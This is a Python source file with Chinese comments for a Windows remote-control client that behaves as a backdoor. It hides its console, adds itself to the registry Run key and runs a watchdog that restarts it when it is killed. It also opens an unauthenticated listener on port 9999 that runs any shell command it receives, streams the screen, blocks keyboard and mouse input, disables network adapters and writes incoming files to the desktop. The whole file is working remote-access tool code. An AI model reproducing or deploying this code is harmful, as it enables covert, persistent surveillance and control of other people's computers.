import socket
import os
import sys
import time
import threading
import ctypes
import subprocess
import winreg
from datetime import datetime
import psutil
import tkinter as tk
from tkinter import messagebox
import queue
import traceback
import getpass
from PIL import ImageGrab, Image  # 用于屏幕捕获
import io

# 修复 ctypes.wintypes 缺失问题
if not hasattr(ctypes, 'wintypes'):
    class Wintypes:
        class HWND(ctypes.c_void_p):
            pass
        class UINT(ctypes.c_uint):
            pass
        class WPARAM(ctypes.c_ulong):
            pass
        class LPARAM(ctypes.c_long):
            pass
        class LRESULT(ctypes.c_long):
            pass
        UINT_PTR = WPARAM  # 修复 UINT_PTR 缺失问题
    ctypes.wintypes = Wintypes()
elif not hasattr(ctypes.wintypes, 'UINT_PTR'):
    ctypes.wintypes.UINT_PTR = ctypes.wintypes.WPARAM

# 配置参数
SERVER_IP = '0.0.0.0'
SERVER_PORT = 9999
LOG_FILE = "client_log.txt"
SELF_RESTART_DELAY = 5  # 自动重启延迟（秒）
MONITOR_INTERVAL = 2  # 进程监控间隔（秒）
NORMAL_EXIT_FILE = "normal_exit.tmp"   # 正常退出标记文件
MESSAGE_SEPARATOR = "|||__SEP__|||"
IMAGE_MAGIC_NUMBER = b"IMGB"  # 图像数据开头的魔术数字，用于识别
MAX_IMAGE_SIZE = 10 * 1024 * 1024  # 最大图像大小限制（10MB）

class ClientServer:
    def __init__(self):
        self.running = True
        self.normal_exit = False
        self.lock = threading.Lock()
        self.input_locked = False
        self.internet_disabled = False
        self.server_socket = None
        self.client_socket = None
        
        # 屏幕监控相关变量
        self.monitoring = False
        self.monitor_thread = None
        self.screen_width = 1280  # 默认宽度设为HD分辨率
        self.screen_height = 720   # 默认高度设为HD分辨率
        self.fps = 10  # 降低默认FPS以提高稳定性
        self.quality = 50
        self.delay = 0.5
        
        # 获取屏幕实际分辨率和缩放比例
        self.screen_info = self.get_screen_resolution()
        self.max_width, self.max_height, self.scale_factor = self.screen_info
        self.log(f"检测到屏幕分辨率: {self.max_width}x{self.max_height}, 缩放比例: {self.scale_factor}x")
        
        # 获取桌面路径
        self.desktop_path = self.get_desktop_path()
        self.log(f"文件将保存到桌面: {self.desktop_path}")
        
        # 弹窗相关设置
        self.msg_queue = queue.Queue()
        self.ui_initialized = False
        self.ui_thread = threading.Thread(target=self.create_ui, daemon=True)
        self.ui_thread.start()
        
        # 等待UI初始化完成
        start_time = time.time()
        while not self.ui_initialized and time.time() - start_time < 5:
            time.sleep(0.1)
        
        if not self.ui_initialized:
            self.log("警告: UI初始化超时，可能影响弹窗功能")
        
        self.log("被控端程序启动")
        self.hide_window()
        self.set_autostart()
        self.start_monitor_process()
        self.start_server()
        self.main_loop()
    
    def get_screen_resolution(self):
        """获取实际屏幕分辨率和缩放比例，解决高DPI显示问题"""
        try:
            # 获取系统缩放比例
            user32 = ctypes.windll.user32
            gdi32 = ctypes.windll.gdi32
            
            # 获取屏幕DC
            hdc = user32.GetDC(None)
            
            # 获取原始分辨率（不考虑缩放）
            width = gdi32.GetDeviceCaps(hdc, 118)  # DESKTOPHORZRES
            height = gdi32.GetDeviceCaps(hdc, 117) # DESKTOPVERTRES
            
            # 获取缩放后的分辨率
            scaled_width = user32.GetSystemMetrics(0)  # SM_CXSCREEN
            scaled_height = user32.GetSystemMetrics(1) # SM_CYSCREEN
            
            # 计算缩放比例
            scale_factor = round(width / scaled_width, 2)
            
            user32.ReleaseDC(None, hdc)
            
            return (width, height, scale_factor)
        except Exception as e:
            self.log(f"获取屏幕分辨率失败: {str(e)}，使用默认值 1920x1080")
            return (1920, 1080, 1.0)
    
    def get_desktop_path(self):
        """获取当前用户的桌面路径"""
        try:
            # 方法1: 使用环境变量
            if os.name == 'nt':  # Windows系统
                return os.path.join(os.environ['USERPROFILE'], 'Desktop')
            else:  # 其他系统
                return os.path.join(os.path.expanduser('~'), 'Desktop')
        except:
            try:
                # 方法2: 使用用户名获取
                username = getpass.getuser()
                return f"C:\\Users\\{username}\\Desktop"
            except:
                # 方法3: 最后的 fallback
                return os.path.join(os.getcwd(), "Desktop")
    
    def create_ui(self):
        """创建独立的UI线程"""
        try:
            self.root = tk.Tk()
            self.root.withdraw()  # 隐藏主窗口
            self.ui_initialized = True
            threading.current_thread().name = "UI-Thread"
            self.check_msg_queue()
            self.root.mainloop()
        except Exception as e:
            self.log(f"UI线程初始化失败: {str(e)}\n{traceback.format_exc()}")
            self.ui_initialized = False
    
    def check_msg_queue(self):
        """检查消息队列并显示弹窗"""
        try:
            while not self.msg_queue.empty():
                msg = self.msg_queue.get()
                if not isinstance(msg, str):
                    msg = str(msg)
                if not msg.strip():
                    msg = "收到空消息"
                    self.log("弹窗内容为空，显示默认提示")
                
                top = tk.Toplevel(self.root)
                top.title("远程消息")
                top.attributes("-topmost", True)
                top.geometry("400x200+{}+{}".format(
                    int(self.root.winfo_screenwidth()/2 - 200),
                    int(self.root.winfo_screenheight()/2 - 100)
                ))
                
                msg_label = tk.Label(top, text=msg, wraplength=380, padx=10, pady=10)
                msg_label.pack(expand=True, fill=tk.BOTH)
                
                ok_btn = tk.Button(top, text="确定", command=top.destroy)
                ok_btn.pack(pady=10)
                
                top.update_idletasks()
                top.update()
                
                self.log(f"弹窗显示成功，内容长度: {len(msg)} 字符")
                
            self.root.after(50, self.check_msg_queue)
        except Exception as e:
            self.log(f"弹窗处理错误: {str(e)}\n{traceback.format_exc()}")
            self.root.after(50, self.check_msg_queue)
    
    def hide_window(self):
        """隐藏控制台窗口"""
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except Exception as e:
            self.log(f"隐藏窗口失败: {str(e)}")
    
    def set_autostart(self):
        """设置开机自启动"""
        try:
            if getattr(sys, 'frozen', False):
                script_path = sys.executable
            else:
                script_path = os.path.abspath(sys.argv[0])
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, "RemoteControlClient", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            self.log("开机自启动设置成功")
        except Exception as e:
            self.log(f"开机自启动设置失败: {str(e)}")
    
    def log(self, message):
        """记录日志"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] {message}\n"
            
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
            print(f"[{timestamp}] {message}")  # 同时输出到控制台
        except Exception as e:
            print(f"日志记录失败: {str(e)}")
    
    def start_monitor_process(self):
        """启动独立监控进程"""
        current_pid = os.getpid()
        self.log(f"主进程ID: {current_pid}，启动监控进程")
        
        # 确保获取正确的应用路径，特别是在exe模式下
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = os.path.abspath(sys.argv[0])
        
        monitor_script = f"""
import psutil
import time
import subprocess
import sys
import os
import signal

TARGET_PID = {current_pid}
SELF_RESTART_DELAY = {SELF_RESTART_DELAY}
APP_PATH = r"{app_path}"
NORMAL_EXIT_FILE = "{NORMAL_EXIT_FILE}"
MONITOR_INTERVAL = {MONITOR_INTERVAL}

def is_process_running(pid):
    try:
        proc = psutil.Process(pid)
        # 检查进程是否真的在运行，而不是僵尸进程
        return proc.status() != psutil.STATUS_ZOMBIE
    except psutil.NoSuchProcess:
        return False
    except Exception:
        return False

def monitor_and_restart():
    # 记录监控进程自己的PID用于调试
    with open("monitor_pid.txt", "w") as f:
        f.write(str(os.getpid()))
        
    while True:
        try:
            if is_process_running(TARGET_PID):
                time.sleep(MONITOR_INTERVAL)
            else:
                if os.path.exists(NORMAL_EXIT_FILE):
                    os.remove(NORMAL_EXIT_FILE)
                    print("检测到正常退出，监控进程终止")
                    break
                    
                print(f"进程{{TARGET_PID}}异常终止，{{SELF_RESTART_DELAY}}秒后重启...")
                time.sleep(SELF_RESTART_DELAY)
                
                # 检查是否已经存在相同的应用进程，避免重复启动
                current_name = os.path.basename(APP_PATH).lower()
                running_count = 0
                
                for proc in psutil.process_iter(['name', 'pid']):
                    try:
                        if proc.info['name'].lower() == current_name and proc.info['pid'] != os.getpid():
                            running_count += 1
                            if running_count > 1:  # 已经有足够的进程在运行
                                print(f"发现{{running_count}}个相同进程在运行，取消重启")
                                return
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                try:
                    if APP_PATH.endswith('.exe'):
                        subprocess.Popen([APP_PATH], close_fds=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
                    else:
                        subprocess.Popen([sys.executable, APP_PATH], close_fds=True)
                    print(f"应用已重启: {{APP_PATH}}")
                    # 重启后监控进程退出，由新的主进程创建新的监控进程
                    return
                except Exception as e:
                    print(f"重启失败: {{e}}")
                    time.sleep(10)
        except Exception as e:
            print(f"监控循环错误: {{e}}")
            time.sleep(10)

if __name__ == "__main__":
    monitor_and_restart()
        """
        
        monitor_script_path = os.path.join(os.path.dirname(sys.argv[0]), "process_monitor_temp.py")
        with open(monitor_script_path, "w", encoding="utf-8") as f:
            f.write(monitor_script)
        
        try:
            # 使用更安全的方式启动监控进程，避免控制台窗口
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            subprocess.Popen(
                [sys.executable, monitor_script_path],
                close_fds=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                startupinfo=startupinfo
            )
            self.log("监控进程已启动")
        except Exception as e:
            self.log(f"启动监控进程失败: {str(e)}")
    
    def stop(self):
        """正常退出"""
        self.normal_exit = True
        self.running = False
        self.monitoring = False  # 停止监控
        
        # 创建正常退出标记文件
        try:
            with open(NORMAL_EXIT_FILE, "w") as f:
                f.write("1")
        except Exception as e:
            self.log(f"创建正常退出标记文件失败: {str(e)}")
        
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        # 清理临时文件
        for file in ["process_monitor_temp.py", "monitor_pid.txt"]:
            if os.path.exists(file):
                try:
                    os.remove(file)
                except Exception as e:
                    self.log(f"删除临时文件 {file} 失败: {str(e)}")
        
        self.log("程序正常退出")
        sys.exit(0)
    
    def start_server(self):
        """启动服务器监听连接"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # 设置套接字选项，允许端口重用
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((SERVER_IP, SERVER_PORT))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1)
            self.log(f"服务器启动，监听 {SERVER_IP}:{SERVER_PORT}")
        except Exception as e:
            self.log(f"服务器启动失败: {str(e)}")
            self.stop()
    
    def handle_client(self, client_socket):
        """处理客户端命令"""
        self.client_socket = client_socket
        try:
            client_addr = client_socket.getpeername()
            self.log(f"新客户端连接: {client_addr}")
            
            while self.running:
                # 设置接收超时，防止永久阻塞
                client_socket.settimeout(5)
                try:
                    data = client_socket.recv(4096).decode('utf-8', errors='ignore')
                except socket.timeout:
                    # 超时不关闭连接，继续等待
                    continue
                except Exception as e:
                    self.log(f"接收数据错误: {str(e)}")
                    break
                    
                if not data:
                    break
                    
                self.log(f"收到命令: {data} (长度: {len(data)})")
                
                # 屏幕监控命令处理
                if data.startswith("__START_MONITOR__" + MESSAGE_SEPARATOR):
                    try:
                        parts = data.split(MESSAGE_SEPARATOR)
                        if len(parts) < 6:
                            client_socket.sendall("屏幕监控命令格式错误".encode('utf-8'))
                            continue
                            
                        # 解析监控参数并验证
                        try:
                            req_width = int(parts[1])
                            req_height = int(parts[2])
                            req_fps = int(parts[3])
                            req_quality = int(parts[4])
                            req_delay = float(parts[5])
                        except ValueError as e:
                            error_msg = f"监控参数解析错误: {str(e)}"
                            self.log(error_msg)
                            client_socket.sendall(error_msg.encode('utf-8'))
                            continue
                            
                        # 限制分辨率不超过实际屏幕分辨率
                        self.screen_width = min(req_width, self.max_width)
                        self.screen_height = min(req_height, self.max_height)
                        
                        # 确保宽高比合理（防止畸形分辨率）
                        aspect_ratio = self.screen_width / self.screen_height
                        if aspect_ratio < 1.2 or aspect_ratio > 2.5:
                            self.log(f"检测到不合理的宽高比 {aspect_ratio:.2f}，使用默认HD分辨率")
                            self.screen_width, self.screen_height = 1280, 720
                        
                        # 限制FPS范围
                        self.fps = max(1, min(req_fps, 15))  # 限制最大FPS为15，提高稳定性
                        
                        # 限制质量范围
                        self.quality = max(10, min(req_quality, 80))
                        
                        # 限制延迟范围
                        self.delay = max(0.2, min(req_delay, 2.0))
                        
                        # 启动监控线程
                        self.monitoring = True
                        if self.monitor_thread is None or not self.monitor_thread.is_alive():
                            self.monitor_thread = threading.Thread(target=self.capture_and_send_screen, daemon=True)
                            self.monitor_thread.start()
                        
                        # 发送实际使用的参数（可能经过调整）
                        response = f"开始屏幕监控 - 已调整参数: {self.screen_width}x{self.screen_height}, FPS: {self.fps}, 质量: {self.quality}, 延迟: {self.delay}s"
                        client_socket.sendall(response.encode('utf-8'))
                        
                    except Exception as e:
                        error_msg = f"处理屏幕监控命令失败: {str(e)}"
                        self.log(error_msg)
                        client_socket.sendall(error_msg.encode('utf-8'))
                
                elif data == "__STOP_MONITOR__":
                    self.monitoring = False
                    client_socket.sendall("已停止屏幕监控".encode('utf-8'))
                
                # 弹窗命令处理
                elif data.startswith("__POPUP_MESSAGE__" + MESSAGE_SEPARATOR):
                    try:
                        separator_pos = data.find(MESSAGE_SEPARATOR)
                        if separator_pos == -1:
                            client_socket.sendall("弹窗消息格式错误: 未找到分隔符".encode('utf-8'))
                            continue
                            
                        msg = data[separator_pos + len(MESSAGE_SEPARATOR):]
                        
                        if not msg.strip():
                            msg = "收到空消息内容"
                            self.log("检测到空消息内容，使用默认文本")
                        
                        if self.ui_initialized:
                            self.msg_queue.put(msg)
                            client_socket.sendall(f"弹窗消息已发送，内容长度: {len(msg)} 字符".encode('utf-8'))
                        else:
                            error_msg = "弹窗功能不可用，UI初始化失败"
                            self.log(error_msg)
                            client_socket.sendall(error_msg.encode('utf-8'))
                            
                    except Exception as e:
                        error_msg = f"处理弹窗消息失败: {str(e)}"
                        self.log(error_msg)
                        client_socket.sendall(error_msg.encode('utf-8'))
                
                elif data == "__EXIT__":
                    client_socket.sendall("收到退出命令，程序即将关闭".encode('utf-8'))
                    # 给服务器一点时间接收消息
                    time.sleep(1)
                    self.stop()
                
                elif data == "__LOCK_INPUT__":
                    res = self.lock_input_devices()
                    client_socket.sendall(res.encode('utf-8'))
                elif data == "__UNLOCK_INPUT__":
                    res = self.unlock_input_devices()
                    client_socket.sendall(res.encode('utf-8'))
                elif data == "__disable_INTERNET__":
                    res = self.disable_internet()
                    client_socket.sendall(res.encode('utf-8'))
                elif data == "__enable_INTERNET__":
                    res = self.enable_internet()
                    client_socket.sendall(res.encode('utf-8'))
                elif data.startswith("__SEND_FILE__"):
                    try:
                        _, file_name, file_size = data.split("|")
                        res = self.receive_file(client_socket, file_name, int(file_size))
                        client_socket.sendall(res.encode('utf-8'))
                    except Exception as e:
                        error_msg = f"解析文件传输命令失败: {str(e)}"
                        self.log(error_msg)
                        client_socket.sendall(error_msg.encode('utf-8'))
                else:
                    res = self.execute_command(data)
                    client_socket.sendall(res.encode('utf-8'))
        except Exception as e:
            self.log(f"客户端处理错误: {str(e)}\n{traceback.format_exc()}")
        finally:
            self.monitoring = False  # 确保监控停止
            try:
                client_socket.close()
            except:
                pass
            self.client_socket = None
            self.log("客户端连接已关闭")
    
    def capture_and_send_screen(self):
        """捕获屏幕并发送（优化版，提高稳定性）"""
        self.log(f"开始屏幕捕获 - {self.screen_width}x{self.screen_height}, {self.fps}FPS")
        try:
            interval = 1.0 / self.fps  # 计算帧间隔时间
            last_send_time = 0
            
            while self.monitoring and self.client_socket:
                # 控制发送频率
                current_time = time.time()
                if current_time - last_send_time < interval:
                    # 等待到下一帧的时间
                    sleep_time = max(0, interval - (current_time - last_send_time))
                    time.sleep(sleep_time)
                    continue
                
                last_send_time = current_time
                start_time = current_time
                
                try:
                    # 捕获屏幕，考虑缩放比例
                    screenshot = ImageGrab.grab()
                    
                    # 调整大小
                    screenshot = screenshot.resize(
                        (self.screen_width, self.screen_height), 
                        Image.LANCZOS  # 使用高质量缩放算法
                    )
                    
                    # 保存到内存缓冲区
                    img_buffer = io.BytesIO()
                    screenshot.save(img_buffer, format='JPEG', quality=self.quality, optimize=True)
                    img_buffer.seek(0)
                    img_data = img_buffer.getvalue()
                    img_buffer.close()
                    
                    # 检查图像大小，如果超过限制则降低质量并重试
                    if len(img_data) > MAX_IMAGE_SIZE:
                        self.log(f"图像大小超过限制 ({len(img_data)} > {MAX_IMAGE_SIZE})，降低质量重试")
                        # 降低质量并重试
                        new_quality = max(10, self.quality - 10)
                        img_buffer = io.BytesIO()
                        screenshot.save(img_buffer, format='JPEG', quality=new_quality, optimize=True)
                        img_buffer.seek(0)
                        img_data = img_buffer.getvalue()
                        img_buffer.close()
                        self.quality = new_quality  # 更新质量设置
                    
                    # 发送数据：魔术数字 + 数据长度 + 图像数据
                    try:
                        # 魔术数字用于识别图像数据
                        self.client_socket.sendall(IMAGE_MAGIC_NUMBER)
                        # 数据长度（4字节）
                        data_length = len(img_data).to_bytes(4, byteorder='big')
                        self.client_socket.sendall(data_length)
                        # 图像数据
                        sent = 0
                        while sent < len(img_data) and self.monitoring and self.client_socket:
                            chunk_size = min(4096, len(img_data) - sent)
                            self.client_socket.sendall(img_data[sent:sent+chunk_size])
                            sent += chunk_size
                        
                        # 验证是否发送完整
                        if sent != len(img_data):
                            self.log(f"图像数据发送不完整，预期 {len(img_data)} 字节，实际发送 {sent} 字节")
                    except Exception as e:
                        self.log(f"发送图像数据失败: {str(e)}")
                        break
                    
                    # 计算耗时，确保不会超过预期的帧间隔
                    elapsed = time.time() - start_time
                    if elapsed > interval * 2:  # 如果耗时超过预期的两倍
                        self.log(f"警告: 屏幕捕获和发送耗时过长: {elapsed:.2f}秒，超过帧间隔 {interval:.2f}秒的两倍")
                    
                except Exception as e:
                    self.log(f"屏幕捕获或发送错误: {str(e)}")
                    # 短暂延迟后重试
                    time.sleep(0.5)
                    if not self.client_socket or not self.monitoring:
                        break
            
            self.log("屏幕监控已停止")
            
        except Exception as e:
            self.log(f"屏幕监控线程错误: {str(e)}\n{traceback.format_exc()}")
            self.monitoring = False
    
    def execute_command(self, cmd):
        """执行系统命令"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30  # 设置超时，防止命令卡住
            )
            # 限制输出长度，防止过大的数据
            output = result.stdout[:10000]  # 只保留前10000字符
            if len(result.stdout) > 10000:
                output += "\n...输出内容过长，已截断..."
            return f"命令执行成功:\n{output}"
        except subprocess.CalledProcessError as e:
            return f"命令执行失败 (返回码: {e.returncode}):\n{e.stderr[:5000]}"
        except subprocess.TimeoutExpired:
            return f"命令执行超时（30秒）"
        except Exception as e:
            return f"执行命令时发生错误: {str(e)}"
    
    def lock_input_devices(self):
        """锁定输入设备"""
        if self.input_locked:
            return "输入设备已处于锁定状态"
        
        try:
            # 调用Windows API锁定输入
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            result = user32.BlockInput(True)
            if result:
                self.input_locked = True
                return "输入设备已锁定"
            else:
                return f"锁定输入设备失败，系统错误: {ctypes.get_last_error()}"
        except Exception as e:
            return f"锁定输入设备失败: {str(e)}"
    
    def unlock_input_devices(self):
        """解锁输入设备"""
        if not self.input_locked:
            return "输入设备已处于解锁状态"
        
        try:
            # 调用Windows API解锁输入
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            result = user32.BlockInput(False)
            if result:
                self.input_locked = False
                return "输入设备已解锁"
            else:
                return f"解锁输入设备失败，系统错误: {ctypes.get_last_error()}"
        except Exception as e:
            return f"解锁输入设备失败: {str(e)}"
    
    def disable_internet(self):
        """禁用网络连接"""
        if self.internet_disabled:
            return "网络已处于禁用状态"
        
        try:
            adapters = self.get_network_adapters()
            results = []
            
            for adapter in adapters:
                try:
                    subprocess.run(
                        ["netsh", "interface", "set", "interface", f'"{adapter}"', "admin=disable"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    results.append(f"已禁用: {adapter}")
                except Exception as e:
                    results.append(f"禁用 {adapter} 失败: {str(e)}")
            
            self.internet_disabled = True
            return "\n".join(results)
        except Exception as e:
            return f"禁用网络失败: {str(e)}"
    
    def enable_internet(self):
        """启用网络连接"""
        if not self.internet_disabled:
            return "网络已处于启用状态"
        
        try:
            adapters = self.get_network_adapters()
            results = []
            
            for adapter in adapters:
                try:
                    subprocess.run(
                        ["netsh", "interface", "set", "interface", f'"{adapter}"', "admin=enable"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    results.append(f"已启用: {adapter}")
                except Exception as e:
                    results.append(f"启用 {adapter} 失败: {str(e)}")
            
            self.internet_disabled = False
            return "\n".join(results)
        except Exception as e:
            return f"启用网络失败: {str(e)}"
    
    def get_network_adapters(self):
        """获取网络适配器列表"""
        try:
            result = subprocess.run(
                ["netsh", "interface", "show", "interface"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            adapters = []
            lines = result.stdout.splitlines()
            
            for line in lines[3:]:  # 跳过标题行
                parts = line.strip().split(maxsplit=3)
                if len(parts) >= 4:
                    adapters.append(parts[3])
            
            return adapters if adapters else ["Ethernet", "Wi-Fi"]
        except Exception as e:
            self.log(f"获取网络适配器失败: {str(e)}")
            return ["Ethernet", "Wi-Fi"]
    
    def receive_file(self, client_socket, file_name, file_size):
        """接收文件并保存到桌面"""
        try:
            # 确保桌面目录存在
            if not os.path.exists(self.desktop_path):
                os.makedirs(self.desktop_path)
            
            # 构建完整的保存路径（桌面 + 文件名）
            save_path = os.path.join(self.desktop_path, file_name)
            
            # 处理同名文件
            counter = 1
            original_name, extension = os.path.splitext(file_name)
            while os.path.exists(save_path):
                # 如果文件已存在，添加序号
                save_path = os.path.join(self.desktop_path, f"{original_name}_{counter}{extension}")
                counter += 1
            
            # 设置接收超时
            client_socket.settimeout(30)  # 30秒超时
            
            with open(save_path, 'wb') as f:
                received = 0
                start_time = time.time()
                
                while received < file_size and self.running:
                    # 检查是否超时（5分钟）
                    if time.time() - start_time > 300:
                        raise Exception("文件接收超时（5分钟）")
                        
                    chunk_size = min(4096, file_size - received)
                    data = client_socket.recv(chunk_size)
                    if not data:
                        break
                    f.write(data)
                    received += len(data)
                    
                    # 每接收1MB输出一次进度
                    if received % (1024 * 1024) == 0:
                        self.log(f"文件接收进度: {received}/{file_size} 字节 ({received/file_size*100:.1f}%)")
            
            if received == file_size:
                self.log(f"文件接收完成: {save_path}, 大小: {file_size} 字节")
                return f"文件 {file_name} 接收成功，已保存到桌面: {save_path}"
            else:
                # 清理不完整文件
                if os.path.exists(save_path):
                    os.remove(save_path)
                return f"文件 {file_name} 接收不完整，预期 {file_size} 字节，实际接收 {received} 字节"
        except Exception as e:
            error_msg = f"接收文件失败: {str(e)}"
            self.log(error_msg)
            return error_msg
    
    def main_loop(self):
        """主循环，处理新连接"""
        try:
            while self.running:
                try:
                    client_socket, addr = self.server_socket.accept()
                    self.log(f"接受新连接: {addr}")
                    client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                    client_thread.daemon = True
                    client_thread.start()
                except socket.timeout:
                    # 超时是正常的，继续等待新连接
                    continue
                except Exception as e:
                    self.log(f"接受连接失败: {str(e)}")
                    time.sleep(1)
                
                # 短暂延迟，减少CPU占用
                time.sleep(0.1)
        except Exception as e:
            self.log(f"主循环错误: {str(e)}\n{traceback.format_exc()}")
            time.sleep(1)
        finally:
            self.stop()

if __name__ == "__main__":
    try:
        # 确保中文显示正常
        if os.name == 'nt':
            try:
                ctypes.windll.kernel32.SetConsoleCP(65001)
                ctypes.windll.kernel32.SetConsoleOutputCP(65001)
            except:
                pass
        
        # 启动客户端
        client = ClientServer()
    except Exception as e:
        error_msg = f"程序启动失败: {str(e)}"
        print(error_msg)
        # 记录启动失败日志
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] 程序启动失败: {str(e)}\n{traceback.format_exc()}\n")
        except:
            pass
        # 等待用户查看错误
        input("按回车键退出...")
        sys.exit(1)